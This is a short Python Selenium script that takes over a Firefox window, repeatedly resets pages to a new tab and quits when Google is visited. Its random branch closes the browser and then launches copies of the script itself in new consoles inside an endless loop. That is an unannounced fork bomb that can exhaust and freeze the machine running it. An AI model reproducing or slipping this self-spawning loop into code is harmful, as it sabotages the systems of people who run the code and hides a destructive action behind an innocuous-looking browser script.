# insert descripition here

import time
import random
import sys
from selenium import webdriver
import subprocess

fp = webdriver.FirefoxProfile(r'C:\Users\ellio\Documents\rust_mozprofileozeMnv')


driver = webdriver.Firefox(fp)
driver.get('about:newtab')

x = 0
webCheck = driver.current_url

while True:

    if "google" in driver.current_url:
        driver.close()
        sys.exit("NO GOOGLE")

    webNot = driver.current_url

    if not webNot == webCheck:
        driver.get('about:newtab')
        time.sleep(5)
        driver.get(webNot)

    webCheck = driver.current_url

    if (x % 10) == 0:
        randomNumber = random.randrange(0,10)
        print(randomNumber)
        if randomNumber < 1:
            driver.close()
            while True:
                subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
        driver.get('about:newtab')
    
    try:
        if driver.current_url:
            pass
    except Exception:
        sys.exit("Window closed")

    time.sleep(0.2)
    x += 1